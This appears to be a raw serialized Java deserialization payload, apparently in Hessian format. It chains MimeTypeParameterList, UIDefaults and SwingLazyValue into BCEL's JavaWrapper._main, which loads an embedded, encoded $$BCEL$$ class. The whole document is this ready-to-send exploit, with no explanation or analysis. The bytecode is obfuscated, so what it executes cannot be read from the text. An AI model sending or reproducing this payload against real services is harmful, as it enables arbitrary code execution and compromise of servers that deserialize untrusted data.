CC0&javax.activation.MimeTypeParameterList‘
parameters`Mjavax.swing.UIDefaultsxxxCsun.swing.SwingLazyValue“	className
methodNameargsa01com.sun.org.apache.bcel.internal.util.JavaWrapper_mainq[objectq[stringS$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuRMo$d3$40$Q$7d$9b8$f1G$ed$a4MH$L$e5$ab$7c6i$a1$a6$a8$H$a4V$5c$QH$I$d3$oR$F$n$Oh$e3$y$e9$b6$b1$j9N$e9$3f$e2$dc$L$m$w$95$3b$3f$K1$ebDN$a4$EK$9e$f1$cc$9by$f3f$bd$7f$fe$fe$ba$E$b0$83m$L$W$d6$y$dc$c1$5d$D$f7$94$bfo$e0$81$8e$87$3a$d6$z$e8$a8$ebh$e8$d8$60$u$ee$c9P$s$cf$Z$f2$f5F$8bA$7b$Ru$EC$d9$93$a1$d8$l$Gm$R$l$f2v$8f2$V$_$f2y$af$c5c$a9$e2qRK$8e$e4$80$a1$e6$f9Q$e0vD$Q$ed$a4$d6$a5J$7f$97$a1$f09$e02dX$ae$7f$f2$8e$f9$vw$7b$3c$ec$ba$cd$q$96aw7$9d$c6$e3$ee$vCu$O$cc$60$bd$3c$f3E$3f$91QH$p$b4$R$93j$a0$c8$d8$f3$7bc$d9L$a8$f9i$bb$8c$dc$d7$HY$T18$cd$84$fb$toy$3f$95K$cb$Ti3$g$c6$bex$r$95$7cS$e9$dcR$bd6$W$60$eb$d8$b4$f1$I$8fIpp$d2$91$f1$9a$9b$E$7d$b75$ec$85$o$e6$koo$db$d8$82$fb$3f$f4$v$ed1G$G$c3$ead$b7$f7$c30$91$81$c8$405$f6$J$f5$cd9$3e$86$c5I$dfA$fbX$f8$J$c3$d2$M$Vm$d4$VI$W$d4$ea$No$a6$86NB$Tg$82$u$d7$ebs$fe$c3T$ea$5d$i$f9b0$a0$86$ab$d3$95$87Gq$f4U$j$n$fd4$baI$s$5d$z$f5h$60$ea$d8$c8$3a$U$b9$e4$Z$f9$c2$c6$P$b0s$fa$c8$a1D$b68J$a2L$d6$k$7f$_b$89$bc$89$K$aaT$a5$9a$9f$91W$98$f5$T$b9J$fe$3b$b4$P$T$G$8b$3c$e8$ca$9a0$a6X$y$5cA$8d$fc$f2XH$91$f0$V$e2$h$89$d9$a4WU$cd$I$a9NQ$d0$96$v$85$81k$d9$W_$90O$b1$V$r$a4$a0$84$7c$83$f3$e6$C$faGZ$cb$f8$7d$9e$82$s$95$X$a9$b0$94$ce$_$90$5d$a0$5c$89$b26$918$94$xgc$iBVq$9d$a2$h$e9$W9O$c7M$93$80$5b$a9$b2$db$ff$A$RM$e2$d9$b2$D$A$AZ